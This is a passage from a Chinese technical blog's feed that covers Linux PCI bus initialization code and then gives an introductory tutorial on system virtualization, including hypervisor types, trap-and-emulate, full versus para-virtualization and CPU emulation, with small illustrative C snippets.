class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pcibus_class_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus class，创建 sysfs 下的 class/pci_bus 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">pci_driver_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 pci_bus_type，创建 sysfs 下的 bus/pci 目录</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_pci_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// 注册 acpi_pci_bus，并设置电源管理的相应操作</span><br>↓<br><span class="hljs-function"><span class="hljs-title">acpi_init</span><span class="hljs-params">()</span></span><span class="hljs-comment">// pcie 初始化入口，进行设备识别与模型建立</span><br></code></pre></td></tr></table></figure><p>这里我们挑其中关键的几个来看，首先是 <code>acpi_init()</code>，存在如下调用路径：</p><blockquote><p>前置知识：ACPI 规范</p></blockquote><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">acpi_init</span>()<br><span class="hljs-built_in">pci_mmcfg_late_init</span>() <span class="hljs-comment">// 扫描 MCFG 表，获取所有设备PCI配置空间的基地址</span><br><span class="hljs-built_in">acpi_scan_init</span>()<br><span class="hljs-built_in">acpi_pci_root_init</span>()<br><span class="hljs-built_in">acpi_scan_add_handler_with_hotplug</span>()<span class="hljs-comment">// 添加 handler：pci_root_handler</span><br><span class="hljs-built_in">acpi_bus_scan</span>()<span class="hljs-comment">// 设备扫描，创建 ACPI 设备节点对象</span><br><span class="hljs-built_in">acpi_bus_attach</span>()<span class="hljs-comment">// 处理单个节点并调用 acpi_bus_attach() 处理子节点（DFS）</span><br><span class="hljs-built_in">acpi_scan_attach_handler</span>()<span class="hljs-comment">// 查找匹配的 handler 并调用 attach 指针</span><br>handler-&gt;<span class="hljs-built_in">attach</span>(device, devid)<br></code></pre></td></tr></table></figure><p>那么现在我们来看对应的 handler，为在 <code>acpi_scan_add_handler_with_hotplug()</code> 中注册的 <code>pci_root_handler</code> ，该变量定义于 <code>/drivers/acpi/pci_host.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">acpi_scan_handler</span> <span class="hljs-title">pci_root_handler</span> =</span> &#123;<br>.ids = root_device_ids,<br>.attach = acpi_pci_root_add,<br>.detach = acpi_pci_root_remove,<br>.hotplug = &#123;<br>.enabled = <span class="hljs-literal">true</span>,<br>.scan_dependent = acpi_pci_root_scan_dependent,<br>&#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>于是最后调用到 <code>acpi_pci_root_add()</code>，为设备节点创建对应的内核结构体</p><blockquote><p>这个函数中间其实还有一些过程，<s>但是👴摸了</s></p></blockquote><p>接下来我们来看 <code>pci_driver_init()</code>，该函数在内核驱动模型中注册了 PCI 总线，并定义了相关的操作函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">pci_driver_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = bus_register(&amp;pci_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PCIEPORTBUS</span><br>ret = bus_register(&amp;pcie_port_bus_type);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>dma_debug_add_bus(&amp;pci_bus_type);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>postcore_initcall(pci_driver_init);<br></code></pre></td></tr></table></figure><p>该函数中调用了 <code>bus_register()</code> 来注册 PCI 总线，对应到符合内核设备驱动模型的总线类型的变量为 <code>pci_bus_type</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus_type</span> <span class="hljs-title">pci_bus_type</span> =</span> &#123;<br>.name= <span class="hljs-string">&quot;pci&quot;</span>,<br>.match= pci_bus_match,<br>.uevent= pci_uevent,<br>.probe= pci_device_probe,<br>.remove= pci_device_remove,<br>.shutdown= pci_device_shutdown,<br>.dev_groups= pci_dev_groups,<br>.bus_groups= pci_bus_groups,<br>.drv_groups= pci_drv_groups,<br>.pm= PCI_PM_OPS_PTR,<br>.num_vf= pci_bus_num_vf,<br>.dma_configure= pci_dma_configure,<br>.dma_cleanup= pci_dma_cleanup,<br>&#125;;<br>EXPORT_SYMBOL(pci_bus_type);<br></code></pre></td></tr></table></figure><h2 id="二、设备驱动框架">二、设备驱动框架</h2><h2 id="三、PCI-probe-设备识别">三、PCI probe - 设备识别</h2><h2 id="四、PCI-remove-设备移除">四、PCI remove - 设备移除</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;👴等会把你总线都给扬了&lt;/p&gt;</summary>
    
    
    
    <category term="HARDWARE" scheme="http://blog.arttnba3.cn/categories/HARDWARE/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="计算机组成原理" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="Linux Driver" scheme="http://blog.arttnba3.cn/tags/Linux-Driver/"/>
    
  </entry>
  
  <entry>
    <title>【VIRT.0x02】系统虚拟化导论</title>
    <link href="http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/"/>
    <id>http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/</id>
    <published>2022-08-28T20:39:22.000Z</published>
    <updated>2022-09-04T16:44:45.982Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟化方向YLG速成入门指北</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>因为笔者最近不知道为什么开始做 X86 虚拟化这一块的工作了（大雾），而虚拟化的知识点比较杂也比较乱，所以特地开这一篇博客简单记录一下虚拟化的一些基本概念</p><h1>0x01. Virtualization Basis</h1><h2 id="一、虚拟化的基本概念">一、虚拟化的基本概念</h2><p>什么是虚拟化？狭义地说，大家在日常生活中说到的虚拟化主要指的还是 <em>虚拟机</em> （Virtual Machine），即<strong>通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</strong>——这其实是虚拟化技术中的一个抽象粒度为单个计算机的分支：<code>系统虚拟化</code></p><p>在计算机科学当中，<strong>虚拟化</strong>（Virtualization）指的其实是一种「<strong>将计算机的各种实体资源进行逻辑抽象，从而呈现出不同的虚拟资源</strong>」的资源管理技术。利用虚拟化技术，我们可以打破实体结构间不可切割的特性——一份实体资源可以对用户呈现为多份虚拟资源，多份实体资源也可以呈现为一份物理资源。</p><p>通过虚拟化技术，我们可以实现资源的动态分配、灵活调度、跨域共享等，从而提高资源的利用率。</p><p><img src="https://s2.loli.net/2022/08/09/Tj6qGVH82suwhMy.png" alt="image.png"></p><blockquote><p>这里所说的实体资源包括<strong>CPU、内存、磁盘空间、网络适配器</strong>等。</p></blockquote><p>这里笔者摘抄一段来自一本经典的虚拟化技术教材的叙述：</p><blockquote><p>抽象来说，虚拟化是资源的逻辑表示，它不受物理限制的约束。具体来说，虚拟化技术的实现形式是在系统中加入一个虚拟层，虚拟化层将下层的资源抽象成另一形式的资源，提供给上层使用。通过空间上的分割、时间上的分时以及模拟，虚拟化可以将一份资源抽象成多分。反过来，虚拟化也可以将多份资源抽象成一份。</p><p>——《系统虚拟化：原理与实现》</p></blockquote><p>即虚拟化技术的实现其实源自于现代计算机系统自下而上的多层抽象的结构：「<strong>每个层次都向上一层次呈现一个抽象，每一层只需要知道下层的抽象接口，而无需了解其内部运作机制</strong>」——我们不难想到的是，<strong>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化。</strong></p><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png" alt="image.png"></p><p>由此，从物理层与虚拟层的两侧来看，我们便有了虚拟化中的两个重要定语：</p><ul><li>「<strong>Host</strong>」：物理资源方</li><li>「<strong>Guest</strong>」：虚拟资源方</li></ul><p>根据资源的不同，在这两个定语之后我们可以接不同的名词：例如我们将一台物理机器称之为 <code>Host Machine</code> （宿主机），将运行在其上的虚拟机称之为 <code>Guest Machine</code> （客户机）；相应地，在宿主机上若运行有操作系统，则称之为 <code>Host OS</code>，而运行在虚拟机中的操作系统称之为 <code>Guest OS</code></p><p>由此，我们将位于不同抽象层上的虚拟化分为如下类：</p><ul><li><strong>硬件抽象层上的虚拟化</strong>：通过虚拟硬件抽象层来实现虚拟机器，为 Guest OS 呈现与物理硬件相同或相类似的硬件抽象层，也称之为「<strong>系统级虚拟化</strong>」（例如VMWare、Xen）</li><li>操作系统层上的虚拟化：通常指的是操作系统内核可以提供多个互相隔离的用户态实例（通常称之为容器），这些用户态实例对其用户而言就像是一台真实的计算机，有着自己独立的网络、文件系统等（例如 VServer）</li><li>库函数层上的虚拟化：通过虚拟化操作系统的应用级库函数的服务接口，使得应用程序不需要修改就可以在不同的操作系统中无缝运行（例如 Wine、WSL）</li><li>编程语言层上的虚拟化：这类虚拟机运行的是进程级别的不存在于硬件上的虚拟体系结构，其程序代码由虚拟机的运行时支持系统<strong>翻译</strong>成机器语言后再执行，属于进程级的虚拟化（例如 JVM）</li></ul><blockquote><p>例如 Linux kernel 当中的 VFS 便是非常符合虚拟化这一概念的子系统：从上层调用的角度而言，我们所看到的都是统一的 API 接口，不同文件系统的具体实现则被隐藏在了 VFS 层的下方。我们只需要知道在这一抽象层中 open、read、write 等抽象 API 的用法，而无需关注底层的 ext4 或是 ntfs 的内部实现。</p><p>虚拟化亦是如此，从 Guest 侧我们所能看到的也只是统一的虚拟资源的接口，或者说 Host 为我们呈现出了虚拟化的资源接口，其表现的行为与实体设备是一致的。</p></blockquote><p>我们日常所说的虚拟化技术主要是<strong>硬件抽象层上的虚拟化</strong>，即「<strong>系统级虚拟化</strong>」：通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</p><p>针对实体资源类型的不同，我们还可以再细分为：</p><ul><li><strong>计算虚拟化</strong>：针对 CPU 和内存资源进行虚拟化</li><li><strong>网络虚拟化</strong>：针对网络链路资源进行虚拟化</li><li><strong>IO虚拟化</strong>：针对 IO 资源进行虚拟化</li><li><strong>存储虚拟化</strong>：针对磁盘存储资源虚拟化</li></ul><h2 id="二、虚拟化与云计算">二、虚拟化与云计算</h2><p>说到虚拟化就不得不提云计算这一“新兴事物”（其实在笔者写下这句话的时候云计算技术已经发展多年了hhh），似乎每次提到云计算总是离不开虚拟化这个词，那先来和笔者一起看一下「什么是云计算吧」（笑）</p><ul><li>「<strong>云计算</strong>」（Cloud computing）即<strong>通过网络向用户按需提供可动态伸缩的计算服务与 IT 资源</strong>，云服务厂商将多份实体资源以一定形式进行整合后，将其称之为「<strong>云</strong>」，通过互联网按需向用户提供其所需的资源</li></ul><p>相信大家已经注意到其相似之处了——<strong>虚拟化技术便是云计算服务的技术基石之一</strong></p><ul><li>通过虚拟化可以解决数据中心（IDC）资源整合的问题，对计算、存储等资源进行标准化</li><li>通过虚拟化可以将资源进行更为合理的切割调度，从而充分利用硬件资源</li></ul><p><img src="https://s2.loli.net/2022/08/08/5ncJFCOLByoqbPM.png" alt="image.png"></p><blockquote><p>当然云计算的基石不仅仅是虚拟化，但是这篇博客主要讲的还是系统虚拟化而不是云计算（笑）</p></blockquote><p>根据提供的资源服务的类型不同，我们将云服务分为以下三种类型：</p><ul><li><p><strong>Infrastructure-as-a-Service</strong>（IaaS）：云厂商向用户提供<strong>完整的基础设施</strong>，即提供<strong>云硬件环境</strong>，包括计算（CPU）、存储（硬盘）、网络等，用户需要自行在云硬件环境上搭建自己需要的服务</p><blockquote><p>通俗点说就是卖服务器（笑）</p></blockquote></li><li><p><strong>Platform-as-a-Service</strong>（PaaS）：云厂商向用户提供<strong>软件部署平台</strong>，即提供服务器平台或者开发环境，用户可以直接在云平台上进行开发部署等工作，<strong>而无需管理底层的基础设施</strong></p><blockquote><p>比如说微软的 Azure 和 Redhat 的 OpenShift</p></blockquote></li><li><p><strong>Software-as-a-Service</strong>（SaaS）：云厂商向用户提供<strong>具体的软件服务</strong>，用户可以通过网络直接使用厂商提供的服务</p><blockquote><p>比如说腾讯的共享文档就是一个典型的 SaaS</p></blockquote></li></ul><p><img src="https://s2.loli.net/2022/08/07/nF3wLu5cfZQtpPK.png" alt="image.png"></p><p>我们按照其部署形式的不同还可以将云分为以下三类：</p><ul><li><strong>公有云</strong>：云服务的基础设施部署在云厂商的机房里，由云厂商向用户提供云上资源，<strong>云资源实体由多个用户共享</strong>（一台物理服务器上可能跑多个用户的虚拟机）</li><li><strong>私有云</strong>：云服务的基础设施部署在用户自己的机房里（部署在内部自有机房的叫内部私有云，部署在外部托管机房的叫外部私有云），由云厂商提供部署服务或是用户自行部署，<strong>云资源实体由用户独享</strong></li><li><strong>混合云</strong>：用户在使用云厂商提供的云资源的同时自己也搭建了一个云</li></ul><p><img src="https://s2.loli.net/2022/08/07/SrJDGa6shAWq4ul.png" alt="image.png"></p><blockquote><p>现在网上各种关于云计算的文章包括像百度百科这样的，<strong>几乎没有一个能准确给这个概念下一个最基本的定义的</strong>，全篇都是各种假大空的套话，看着让人血压升高…</p><blockquote><p><s>👴觉得百度百科就是个🐓⑧</s></p></blockquote><p>云计算本质上其实就是一个通过互联网向用户按需提供可动态伸缩的 IT 资源，<strong>至于用户拿到这个计算资源后要做什么笔者并不关心</strong>（笑）</p></blockquote><h1>0x02. 系统虚拟化概述</h1><h2 id="一、基本模型">一、基本模型</h2><p>对于一台计算机，我们可以简单地抽象成下图所示的三层模型，从下往上分别是<strong>物理硬件层、操作系统层、应用程序层</strong>：</p><p><img src="https://s2.loli.net/2022/08/02/5jwhR2HnDTCp3q8.png" alt="image.png"></p><p>我们首先给「虚拟机」下一个定义：</p><ul><li><strong>虚拟机</strong>（Virtual Machine）是计算机的虚拟化实例，拥有自己的虚拟硬件（如 CPU、内存、设备等），可执行与计算机几乎完全相同的功能，包括运行应用和操作系统</li></ul><p>即我们可以把一个虚拟机实例看作是一台具有如上图所示层次的<strong>逻辑的计算机</strong></p><p>但虚拟机的运行是需要有物理环境所支撑的，同时虚拟机实例也是不可能凭空出现/凭空消失的，因此接下来我们引入一个新的概念——<strong>VMM</strong>，即 <code>Virtual Machine Monitor</code>，又称 <code>Hypervisor</code>，这是一个介于 VM 与硬件中间的软件层，<strong>其负责 VM 的创建、销毁等工作，并为 VM 提供了运行环境</strong>：「虚拟硬件抽象层」</p><p><img src="https://s2.loli.net/2022/08/05/C4czg3kVIKAJb5L.png" alt="image.png"></p><p>1974年，Gerald J. Popek 与 Robert P. Goldberg 发表了合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a>，在论文中提出了满足虚拟化系统结构的 VMM 的三个充分条件，称之为<code>Popek and Goldberg virtualization requirements</code>：</p><ul><li><strong>等价性</strong>（essentially identical）：一个运行于 VMM 下的程序，<strong>其行为应与直接运行于等价物理机上的同程序的行为完全一致</strong></li><li><strong>资源控制</strong>（resource control）：VMM 对虚拟资源具有<strong>完全的控制能力</strong>，包括资源的分配、监控、回收</li><li><strong>效率性</strong>（efficiency）：机器指令中经常使用的那一部分应在没有 VMM 干预下<strong>直接在硬件上执行</strong></li></ul><p>由此，论文中提出了两种 Hypervisor 方案，这也成为了现在最主流的两种方案：</p><ul><li><p><code>Type I</code> ：<strong>Hypervisor 直接运行在硬件上，即以 Hypervisor 作为 Host OS 直接管控硬件资源</strong>。例如 <code>VMware ESXI</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/Mn2cKxtpXdibHRG.png" alt="image.png"></p></li><li><p><code>Type II</code>：<strong>Hypervisor 运行在传统的操作系统上，与其他应用程序并行运行</strong>。例如 <code>Qemu</code> 与 <code>VMware Player</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/FNComsjbSdTheL6.png" alt="image.png"></p></li></ul><p>具体到技术细节上，我们应该如何去实现上述的虚拟化方案呢？我们先来介绍一个概念——「敏感指令」，即<strong>操作特权资源的指令</strong>，例如 IO 操作、修改页表寄存器等</p><p>为了我们的 VMM 能够完全地控制系统资源，<strong>敏感质量必须在 VMM 的监控审查下完成，或是经由 VMM 来完成</strong>。因此，若一个架构中所有的特权指令都是敏感质量，则我们可以使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>VMM 运行在最高特权级上，Guest VM 运行在低特权级上，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 VMM，此时便能由 VMM 模拟敏感指令的行为</li></ul><p>——这就是系统虚拟化最典中典的模型**「Trap &amp; Emulate」**：</p><ul><li>我们将操作系统分为两个运行模式：「用户模式（user mode）」与「特权模式（privileged mode）」，在用户模式下只能直接执行非特权指令，当执行到特权指令时便会触发异常，从而陷入特权模式对应的处理代码中</li><li>Guest VM 运行在用户模式下，从而使得普通指令可以直接放在 CPU 上执行，当 Guest VM 执行到<strong>敏感指令</strong>时，便会<strong>触发异常，此时由 VMM 介入并模拟其应有的行为</strong></li></ul><p>因此，一个 ISA 是否可以虚拟化，其核心就在于<strong>敏感指令是否都是特权指令</strong></p><p><img src="https://s2.loli.net/2022/08/04/cipfjY89LsgIlVb.png" alt="知乎偷的图"></p><p>而由于硬件实体资源也有着不同的类型，我们将对不同类型实体资源的虚拟化技术分为如下类型：</p><ul><li>CPU 虚拟化</li><li>内存虚拟化</li><li>I/O 虚拟化</li></ul><h2 id="二、遇到的问题">二、遇到的问题</h2><p>在虚拟化技术的发展初期，在个人计算机领域广泛使用的 x86 架构并没有对虚拟化的经典架构「Trap &amp; Emulate」提供很好的支持，存在着对系统虚拟化的支持缺陷，<strong>系统虚拟化并不能直接而有效的实现</strong></p><p>Intel 分级保护环将权限分为 ring0~ ring3，其中操作系统内核运行在 ring0 权限而用户进程运行在 ring3 权限</p><p><img src="https://i.loli.net/2021/02/22/yQXZhLEHVn1b3uC.png" alt=""></p><p>在系统虚拟化的经典架构「Trap &amp; Emulate」中， Guest OS 全部运行在 ring3，当涉及到一些敏感指令时，VM 触发 General Protection 异常，由 VMM 进行截获并处理，<strong>但不是所有敏感指令都是特权指令，不是所有的敏感指令都有触发异常以让 VMM 介入的机会</strong>， x86 架构中<strong>一共有 17 条非特权敏感指令</strong>：</p><p><img src="https://s2.loli.net/2022/08/04/qirIbepFOA4U5xf.png" alt="image.png"></p><p>这些指令<strong>直接违反了 <code>Popek and Goldberg virtualization requirements</code> ，从而使得 x86 不是一个可以虚拟化的架构</strong></p><blockquote><p>例如在 x86 下我们想要用 popf 修改 eflags 的中断开关位（IF）时，若我们在用户态下进行这样的操作，<strong>则会直接被硬件所忽视，而不会引起异常</strong>，这令 VMM 无法介入</p></blockquote><p>“硬件不够，软件来凑”。因此在硬件还未提供对虚拟化的足够支持之前，Hypervisor 只能从软件层面下功夫，于是出现了两种纯软件虚拟化技术：「模拟执行」（VMWare）与「直接源代码改写」（Xen）</p><p>在软件虚拟化技术已经发展成熟多年之后，x86 架构对虚拟化的支持才姗姗来迟：「硬件辅助虚拟化」（Intel VT）开始出现在人们的视野当中</p><h2 id="三、实现方案">三、实现方案</h2><h3 id="I-完全虚拟化（Full-virtualization）">I.完全虚拟化（Full-virtualization）</h3><p>完全虚拟化技术提供一个<strong>完整的虚拟化硬件环境</strong>，允许<strong>未经修改的 Guest OS 直接在 VM 上运行</strong>，在 Guest OS 的视角，其与运行在真实的物理平台上一般无二</p><p>完全虚拟化意味着 Guest OS 会将操作正常的处理器、内存、I/O 设备那样在虚拟化硬件环境中操作，因此这需要 VMM 能够正确处理 Guest OS 所有可能的行为，因此这需要对应的架构满足 <code>Popek and Goldberg virtualization requirements</code></p><p>由于 x86 架构的硬件在最初并没有对虚拟化提供很好的支持，因此完全虚拟化经历了两个阶段：</p><h4 id="1）「软件辅助的完全虚拟化」">1）「软件辅助的完全虚拟化」</h4><p>纯软件实现的完全虚拟化主要依赖两个技术：</p><ul><li><strong>「优先级压缩」</strong>（Ring Compression）：<strong>即 VMM 与 GUest VM 运行在不同的特权级上</strong>。例如 <code>VMM 运行在 ring0、Guest OS kernel 运行在 ring1、Guest APP 运行在 ring3 </code>，当 Guest OS 想要尝试执行特权指令时，便会触发异常，此时 VMM 便能截获该特权指令并进行模拟执行。但正如我们前面所说，<strong>不是所有敏感指令都是特权指令</strong>，这使得部分敏感指令无法被 VMM 截获并处理，从而导致了虚拟化平台与物理平台表现的行为不一致</li><li><strong>「二进制代码翻译」</strong>（Binary Translation）：二进制代码翻译被引入来<strong>处理对虚拟化不友好的指令</strong>，其思想便是扫描并修改 Guest VM 的二进制代码，将难以虚拟化的指令转化为支持虚拟化的指令（例如显式地触发异常让 VMM 得以介入），对于非敏感指令则仍是直接执行。这在确保了性能的情况下实现了完全虚拟化</li></ul><p><img src="https://s2.loli.net/2022/08/05/AqLhpontmYHCS8T.png" alt="image.png"></p><blockquote><p>VMware 与 Qemu 便都是采用了二进制代码翻译的支持完全虚拟化的虚拟机软件，不过最初的 Qemu 更类似于【解释执行】的模式</p></blockquote><p>虽然在优先级压缩与二进制代码翻译技术的配合下 x86 架构成功地实现了完全虚拟化，但是这种“打补丁”的方式很难在架构上保证完整性，因此 x86 厂商最终在硬件上加入了对虚拟化的支持，从硬件架构层面实现了完全虚拟化</p><h4 id="2）「硬件辅助的完全虚拟化」">2）「硬件辅助的完全虚拟化」</h4><p>在纯软件虚拟化技术发展多年后，x86 架构对虚拟化的支持终于姗姗来迟：Intel 与 AMD 分别推出了自家的硬件虚拟化技术 Intel VT 与 AMD-v，在硬件层面添加了对虚拟化的支持，使得 x86 架构终于成为一个符合 <code>Popek and Goldberg virtualization requirements</code>的 ISA（Infrastructure Set Architecture），从而得以实现完全虚拟化</p><p>硬件辅助虚拟化本质上是通过在 Guest OS 与硬件中间再添加一个 VMM 中间层来实现的，<strong>由硬件负责截获 OS 对敏感指令的执行与对敏感资源的访问，并通过异常的方式报告给 VMM</strong>，从而从硬件层面实现了 <code>Popek and Goldberg virtualization requirements</code></p><p><img src="https://s2.loli.net/2022/08/05/1rfEzK89DG6Moml.png" alt="image.png"></p><p>以 <code>Intel VT-x</code> 技术为例，其在硬件架构上将 CPU 的运行模式分为两种：<strong>「Non-Root Mode」与「Root Mode」</strong>，这两个运行模式都有着各自的分级保护环，其中 Host OS 与 VMM 运行在 Root Mode 下而 Guest OS 则运行在 Non-Root Mode 下</p><p>Root Mode 与原有的运行模式一般无二，在 Non-Root Mode下非敏感指令可以直接在硬件上执行，当 Guest OS 运行了敏感指令时，硬件便会捕获到这一行为，切换到 Root Mode 并将之报告给 VMM，由 VMM 处理好后再恢复到 Non-Root Mode 中继续 Guest OS 的运行，<strong>这从硬件层面实现了「Trap &amp; Emulate」模型</strong></p><p><img src="https://s2.loli.net/2022/08/05/n9TRrsCkKZvGE3U.png" alt="image.png"></p><h3 id="II-半虚拟化（Para-virtualization）">II.半虚拟化（Para-virtualization）</h3><p>半虚拟化技术最初的目的也是为了解决 x86 架构无法实现经典虚拟化架构的问题，其<strong>通过修改操作系统内核的代码，使得操作系统内核完全避免这些难以虚拟化的指令</strong>，从而在 x86 架构下实现虚拟化。在半虚拟化技术中，Guest OS 能够感知到自己运行在虚拟化环境中，当涉及到敏感指令的执行或是对敏感资源的访问时，Guest OS 通过名为 <code>Hypercall</code> 的 API 陷入 VMM 中（通常通过陷阱等方式实现），由 VMM 进行相应的操作后再重新返回 VM 中的 Guest OS 继续执行</p><p><img src="https://s2.loli.net/2022/08/05/MhAJEnmCSBzoUVW.png" alt="image.png"></p><blockquote><p>Xen 便是采用了这一模式的虚拟化软件</p></blockquote><p>半虚拟化需要对 OS kernel 的代码进行<strong>大量的修改</strong>，从而使得其支持半虚拟化技术，因此 Windows 这样的闭源操作系统最初是不支持半虚拟化的</p><h2 id="四、libvirt">四、libvirt</h2><p>众所周知系统虚拟化平台不止一种（VMWare、Xen、KVM、…），管理起来较为麻烦，因此 <strong>libvirt</strong> 应运而生</p><p><code>libvirt</code> 是一个<strong>专门用于管理虚拟化平台的工具包</strong>，其提供了用于管理硬件虚拟化的<strong>开源API</strong>（libvirt API）、<strong>守护进程</strong>（libvirtd）与<strong>管理工具</strong>（virsh），可以用于管理现在主流的大部分 VMM：</p><p><img src="https://s2.loli.net/2022/08/08/tUSvuapWKl6dx9z.png" alt="image.png"></p><h1>0x03. CPU 虚拟化</h1><p>CPU 虚拟化是系统虚拟化技术中最核心的部分，因为 CPU 是计算机中最核心的组件，直接控制着整个系统的运行，同时内存访问（内存虚拟化）与 I/O 操作（I/O虚拟化）也都直接依赖于 CPU，因此 CPU 虚拟化是系统虚拟化技术中的核心</p><p>在 Gerald J. Popek 与 Robert P. Goldberg 的合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a> 中提出了满足虚拟化系统结构的 VMM 的三个充分条件：等价性，资源控制，效率性。为了满足这个条件， CPU 虚拟化使用的经典模型是「Trap &amp; Emulate」，使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>Hypervisor 运行在最高特权级上，Guest VM 运行在低特权级上，Guest VM 在硬件上直接执行非敏感指令，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 Hypervisor ，此时便能由 Hypervisor 模拟敏感指令的行为</li><li>当发生 virtual CPU 调度时，我们将 vCPU 的状态保存，恢复 Hypervisor 状态，Hypervisor 完成其行为后进行下一 virtual CPU 的调度，恢复下一 vCPU 的状态并恢复执行</li></ul><p><img src="https://s2.loli.net/2022/08/11/SvO9ewNdxIbsLqV.png" alt="image.png"></p><h2 id="一、纯软件实现虚拟化">一、纯软件实现虚拟化</h2><p>前文我们已经指出 x86 架构存在<strong>非特权敏感指令，直接导致 VMM 无法截获 x86 VM 的敏感行为</strong>，这违反了<code>Popek and Goldberg virtualization requirements</code>，因此在硬件对虚拟化的支持出现之前，虚拟化厂商只好先从软件层面下手</p><h3 id="I-模拟-解释执行">I. 模拟 &amp; 解释执行</h3><p><strong>「模拟」</strong>（Emulate）技术的出现其实早于虚拟化，纯软件的模拟本质上就是通过编写能够呈现出与被模拟对象相同行为的应用程式从而达到运行非同构平台应用程序的效果</p><p>模拟技术不仅能够应用于程序级别的模拟，还能应用于系统级别的模拟：CPU 运行的本质行为其实就是<strong>从 PC 寄存器所指内存区域中不断取出指令解码执行</strong>，我们不难想到的是，实现一个虚拟机最简单粗暴的方法便是通过<strong>模拟每一条指令对应的行为，从而使得 VM 的行为对 VMM 而言是完全可控的</strong></p><blockquote><p>例如，对于 <code>mov rax, rbx</code> 这样的指令，我们可以使用下面的程序来模拟：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">x86_regs</span>&#123;</span><br>    <span class="hljs-type">uint64_t</span> rax;<br>    <span class="hljs-type">uint64_t</span> rbx;<br>    <span class="hljs-type">uint64_t</span> rcx;<br>    <span class="hljs-type">uint64_t</span> rdx;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_regs</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *to, <span class="hljs-type">uint64_t</span> *from)</span><br>&#123;<br>    *to = *from;<br>&#125;<br><br><span 